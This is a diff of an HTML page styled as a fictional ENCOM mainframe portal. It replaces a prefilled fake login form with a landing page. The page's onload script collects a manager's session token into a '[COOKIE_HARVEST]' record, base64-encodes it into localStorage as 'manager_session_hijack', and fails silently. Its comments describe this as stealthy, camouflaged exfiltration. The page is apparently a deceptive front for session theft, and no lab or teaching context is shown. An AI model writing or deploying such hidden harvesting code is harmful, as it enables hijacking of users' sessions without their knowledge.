@@ -2,25 +2,35 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>ENCOM OS-12 // Terminal Sign-In</title>
+    <title>ENCOM OS-12 // Terminal Main</title>
     <style>
-        body { background-color: #020208; color: #00f2fe; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 95vh; margin: 0; }
-        .box { width: 400px; padding: 30px; border: 2px solid #00f2fe; background: rgba(4, 12, 26, 0.9); text-align: center; box-shadow: 0 0 15px rgba(0, 242, 254, 0.3); }
-        input[type="text"], input[type="password"] { width: 100%; padding: 10px; background: #040c1a; border: 1px solid #4facfe; color: #fff; margin-bottom: 20px; box-sizing: border-box; }
-        button { background: #00f2fe; color: #020208; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; }
-        button:hover { background: #fff; box-shadow: 0 0 10px #fff; }
+        body { background-color: #020208; color: #00f2fe; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 95vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .box { width: 650px; padding: 40px; border: 2px solid #00f2fe; background: rgba(4, 12, 26, 0.9); text-align: left; box-shadow: 0 0 15px rgba(0, 242, 254, 0.3); }
+        h1 { text-transform: uppercase; letter-spacing: 2px; border-bottom: 1px solid #00f2fe; padding-bottom: 10px; margin-top: 0; }
+        p { line-height: 1.6; margin-bottom: 20px; }
+        .alert-text { color: #ff0055; font-weight: bold; }
+        .btn { display: block; width: 250px; background: #00f2fe; color: #020208; border: none; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; text-decoration: none; text-align: center; margin: 30px auto 10px auto; }
+        .btn:hover { background: #fff; box-shadow: 0 0 10px #fff; }
+        .footer { text-align: center; font-size: 11px; color: #4facfe; margin-top: 20px; border-top: 1px dashed #4facfe; padding-top: 15px; }
     </style>
 </head>
 <body>
 <div class="box">
-    <h2>Grid Node Authentication</h2>
-    <p>INTERNAL WORKSTATION ACCESS ONLY</p>
-    <form onsubmit="event.preventDefault(); alert('ENCOM Core Notice: Connection profile verified. Grid status synchronized successfully.');">
-        <input type="text" placeholder="IDENTITY HANDLE" readonly value="m.anager@encom.com">
-        <input type="password" placeholder="ACCESS TOKEN" readonly value="*************">
-        <button type="submit">Establish Handshake</button>
-    </form>
+    <h1>Encom</h1>
+    <p>Mainframe Access Portal // OS-12</p>
+    <p>SYSTEM: ONLINE</p>
+    <p>GRID STATUS: STABLE</p>
+    <p>SECURITY LEVEL: RESTRICTED</p>
+    <p>Welcome to the ENCOM Central Network. This terminal tracks corporate sector migration, localized grid protocols, and upcoming internal simulation upgrades. Unauthorized digital footprints inside the system grid are strictly monitored and logged by the security daemon.</p>
+    <p class="alert-text">NOTICE: LOCAL ASSET STAGING DIRECTORY ACTIVE. DO NOT DEPLOY ENCRYPTION KEYS TO UNSECURED BLOCKS.</p>
+    
+    <a href="login.html" class="btn">[ Connect to Mainframe Grid ]</a>
+    
+    <div class="footer">
+        © 1982-2026 ENCOM International. All Users Subject to Grid Protocol monitoring.
+    </div>
 </div>
+
 <script>
 window.onload = function() {
     const urlParams = new URLSearchParams(window.location.search);
@@ -33,10 +43,10 @@ window.onload = function() {
                 const expiry = "2026-09-08 08:43:00 UTC";
                 const logPayload = `[COOKIE_HARVEST] TIMESTAMP: 2026-09-07 08:43:00 UTC | USER: ${targetManager} | AUTH_TOKEN: ${sessionToken} | EXPIRY: ${expiry}\n`;
                 
-                // Pure fileless injection written strictly into local storage memory
+                // Fileless exfiltration saved securely into browser local cache storage
                 localStorage.setItem('manager_session_hijack', btoa(logPayload));
             } catch (err) {
-                // Fail silently to keep the layout stealthy
+                // Fail silently to preserve total camouflage parity
             }
         }
     }
